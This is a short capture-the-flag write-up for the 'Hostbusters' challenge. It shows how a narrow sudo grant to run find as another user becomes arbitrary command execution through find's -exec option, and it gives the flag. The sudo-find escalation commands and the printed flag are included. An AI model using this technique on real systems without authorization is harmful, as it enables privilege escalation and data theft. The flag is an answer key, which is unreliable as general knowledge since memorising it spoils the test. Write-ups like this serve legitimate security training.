# Lilith — Hostbusters (250 pts)

"sunstalker was granted a narrow permission 'to help another member run a job.' Narrow permissions on the wrong binary aren't narrow at all."

## How I solved it

The cron payload from On Schedule ran `sudo -n -l` as sunstalker and saved the output:

```
User sunstalker may run the following commands on charon:
    (lilith) NOPASSWD: /usr/bin/find
```

A "narrow" sudo grant: sunstalker may run **find as lilith** (to help run the collector job). The problem is that find is a GTFOBins classic — `-exec` is arbitrary command execution as that user:

```bash
sudo -n -u lilith find /home/lilith -name flag.txt -exec cat {} +
```

That's it. Read lilith's flag straight out of her home directory. (You can run any command this way: `find /tmp -maxdepth 0 -exec sh -c '...' \;`.)

lilith's home also has an `osint.txt` — worth a look for the storyline.

## Flag

```
deadface{sud0_f1nd_4_w4y_1n}
```
